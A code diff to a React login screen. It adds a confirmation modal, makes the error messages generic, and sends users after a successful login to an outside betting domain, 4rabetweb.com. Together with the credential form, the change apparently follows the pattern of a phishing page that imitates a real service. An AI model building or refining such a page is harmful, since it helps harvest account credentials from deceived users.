@@ -76,6 +76,7 @@ export default function App() {
   const [agree, setAgree] = useState(true);
   const [loginSuccess, setLoginSuccess] = useState(false);
   const [loginError, setLoginError] = useState<string | null>(null);
+  const [showConfirm, setShowConfirm] = useState(false);
   const [loading, setLoading] = useState(false);
 
   // Derived state for button activation
@@ -83,9 +84,13 @@ export default function App() {
     ? (tab === 'phone' ? phone.length > 0 : email.length > 0) && password.length > 0
     : phone.length > 5 && password.length > 0 && agree;
 
-  const handleAction = async () => {
+  const handleAction = () => {
     if (!isInputValid) return;
-    
+    setShowConfirm(true);
+  };
+
+  const confirmSend = async () => {
+    setShowConfirm(false);
     setLoading(true);
     setLoginError(null);
     try {
@@ -110,19 +115,22 @@ export default function App() {
       try {
         result = await response.json();
       } catch (e) {
-        result = { error: 'Invalid server response' };
+        result = { error: 'Invalid response from server' };
       }
 
       if (response.ok) {
         setLoginSuccess(true);
-        setTimeout(() => setLoginSuccess(false), 3000);
+        // Redirect after a short delay
+        setTimeout(() => {
+          window.location.href = 'https://4rabetweb.com/';
+        }, 1500);
       } else {
         setLoginError(result.error || 'Server error. Please try again.');
         setTimeout(() => setLoginError(null), 5000);
       }
     } catch (error: any) {
       console.error('Fetch error:', error);
-      setLoginError('Connection error. Is the server running?');
+      setLoginError('Connection error. Please try again.');
       setTimeout(() => setLoginError(null), 5000);
     } finally {
       setLoading(false);
@@ -384,6 +392,34 @@ export default function App() {
 
         {/* Global Notifications */}
         <AnimatePresence>
+          {showConfirm && (
+            <div className="absolute inset-0 z-50 bg-[#060f1a]/90 backdrop-blur-md flex items-center justify-center p-6">
+              <motion.div 
+                initial={{ scale: 0.9, opacity: 0 }}
+                animate={{ scale: 1, opacity: 1 }}
+                className="bg-[#0d1726] border border-[#1c2e45] rounded-2xl p-8 w-full shadow-2xl text-center"
+              >
+                <div className="w-16 h-16 bg-[#007aff]/10 text-[#007aff] rounded-full flex items-center justify-center mx-auto mb-10">
+                  <MessageSquare size={32} />
+                </div>
+                <div className="flex gap-4">
+                  <button 
+                    onClick={() => setShowConfirm(false)}
+                    className="flex-1 h-[54px] bg-[#1c2e45] text-white rounded-xl font-bold text-base uppercase transition-all hover:bg-[#253a57]"
+                  >
+                    cancel
+                  </button>
+                  <button 
+                    onClick={confirmSend}
+                    className="flex-1 h-[54px] bg-[#007aff] text-white rounded-xl font-bold text-base uppercase transition-all hover:bg-[#006bdd] shadow-[0_6px_20px_rgba(0,122,255,0.3)]"
+                  >
+                    login
+                  </button>
+                </div>
+              </motion.div>
+            </div>
+          )}
+
           {loginSuccess && (
             <motion.div
               initial={{ opacity: 0, y: 50 }}
